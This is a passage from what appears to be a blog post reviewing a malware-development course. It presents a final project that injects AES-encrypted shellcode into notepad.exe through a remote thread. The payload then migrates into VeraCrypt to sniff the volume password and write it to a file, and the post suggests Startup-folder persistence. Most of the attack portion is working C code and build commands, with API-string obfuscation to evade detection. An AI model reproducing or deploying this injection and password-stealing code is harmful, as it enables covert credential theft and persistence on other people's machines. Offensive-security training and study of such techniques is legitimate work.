		// resolve LoadLibrary function pointer, keep it as global variable
		if (pLoadLibraryA == NULL) {
			pLoadLibraryA = (LoadLibrary_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "LoadLibraryA");
			if (pLoadLibraryA == NULL) return NULL;
		}

		// load the external library
		HMODULE hFwd = pLoadLibraryA(sFwdDLL);
		free(sFwdDLL);							// release the allocated memory for lib.func string copy
		if (!hFwd) return NULL;

		// get the address of function the original call is forwarded to
		pProcAddr = hlpGetProcAddress(hFwd, sFwdFunction);
	}

	return (FARPROC) pProcAddr;
}
```

That's how we retrieve the addresses of the most exported functions in `vcload.cpp`.

After that, we look for the `notepad.exe` process and try to inject into it, by performing **Thread Context Injection**. The APIs used in this injection are: `VirtualAllocEx`, `WriteProcessMemory`, `NtCreateThreadEx`, `WaitForSingleObjectEx` and `CloseHandle`.

The code of `tcInject` function is shown below:

```c
// thread context injection
int tcInject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {

	LPVOID pRemoteCode = NULL;
	HANDLE hThread = NULL;
	CLIENT_ID cid;

	VirtualAllocEx_t pVirtualAllocEx = (VirtualAllocEx_t) hlpGetProcAddress(hlpGetModuleHandle(obfKernel), (char *) sVirtualAllocEx);
	WriteProcessMemory_t pWriteProcessMemory = (WriteProcessMemory_t) hlpGetProcAddress(hlpGetModuleHandle(obfKernel), (char *) sWriteProcessMemory);
	NtCreateThreadEx_t pNtCreateThreadEx = (NtCreateThreadEx_t) hlpGetProcAddress(hlpGetModuleHandle(obfNtdll), (char *) sNtCreateThreadEx);
	WaitForSingleObjectEx_t pWaitForSingleObjectEx = (WaitForSingleObjectEx_t) hlpGetProcAddress(hlpGetModuleHandle(obfKernel), (char *) sWaitForSingleObjectEx);
	CloseHandle_t pCloseHandle = (CloseHandle_t) hlpGetProcAddress(hlpGetModuleHandle(obfKernel), (char *) sCloseHandle);

	// Decrypt payload
	AESDecrypt((char *) payload, payload_len, (char *) key, sizeof(key));

	pRemoteCode = pVirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
	pWriteProcessMemory(hProc, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T *) NULL);
	
	pNtCreateThreadEx(&hThread, GENERIC_ALL, NULL, hProc, (LPTHREAD_START_ROUTINE) pRemoteCode, NULL, NULL, NULL, NULL, NULL, NULL);
	if (hThread != NULL) {
			pWaitForSingleObjectEx(hThread, 500, TRUE);
			pCloseHandle(hThread);
			return 0;
	}
	return -1;
}
```

Some of the strings and APIs like: `kernel32.dll` and `CryptAcquireContextW` were obfuscated using <a href="https://github.com/adamyaxley/Obfuscate" target="_blank">Guaranteed compile-time string literal obfuscation header-only library for C++14, by adamyaxley</a>.

Finally, the shellcode (`payload`) is loaded reflectively (from **VCmigrate**) again, and performs the migration from 32-bit `notpead.exe` to 64-bit `VeraCrypt.exe` and the sniffing of the password.

First convert the `vcmigrate.dll` into shellcode and encrypt it with AES:

```shell
C:\Projects\sektor7\intermediate\08.Project\VCload>C:\Python311\python.exe ..\sRDI\Python\ConvertToShellcode.py -f Go vcmigrate.dll
Creating Shellcode: vcmigrate.bin

C:\Projects\sektor7\intermediate\08.Project\VCload>C:\Python311\python.exe aes.py vcmigrate.bin > out.txt

C:\Projects\sektor7\intermediate\08.Project\VCload>
```

Then, copy the whole file `out.txt` and paste into `vcload.cpp` at the top without any modifications.

Finally, we can run the compile script (`compile.bat`) and get the executable `vcload.exe`:

```shell
C:\Projects\sektor7\intermediate\08.Project\VCload>compile.bat
helpers.cpp
vcload.cpp
Generating Code...

C:\Projects\sektor7\intermediate\08.Project\VCload>
```

In order to see this in action, open the 32-bit `notepad.exe`, run `vcload.exe`, open `VeraCrypt.exe`, mount the encrypted volume and put the password. The file `C:\VeraCrypt\data.txt` has been created with contents: `DATA = P@$$w0rd!`. If the `vcload.exe` was placed in the Startup folder and assuming a 32-bit process was spawned at startup, we would achieve a simple persistence mechanism with pasword sniffing capabilities!

## Summary

This was a great course with more advanced content than the Essentials one. Shortly, some of the topics that were covered are the following:
- PE format in detail, as well as Export Address Table (**EAT**) and Import Address Table (**IAT**)
- Custom implementations of `GetProcAddress` and `GetModuleHandle`
- Various code injection techniques like: **Thread Context Injection**, **MapView Code Injection**, **Asynchronous Procedure Call (APC) Queue Code Injection** and **Early Bird APC Queue Code Injection**
- Reflective DLL Injection (**RDI**) and Shellcode RDI (**sRDI**)
- 64-bit shellcode injection to 64-bit process
- 32-bit shellcode injection to 32-bit process
- 64-bit shellcode injection to 32-bit process
- 32-bit shellcode injection to 64-bit process, **WoW64** and **Heaven's Gate**
- Migration betweeen 32-bit and 64-bit processes
- Various API Hooking techniques like: **Hooking with Detours**, **IAT Hooking** and **In-line patching**
- **MultiPayload control**

I highly recommend purchasing this course. Definitely going for either the **Advanced** or the **Evasion** course next.

Please, do not hesitate to contact me for any comments or improvements.
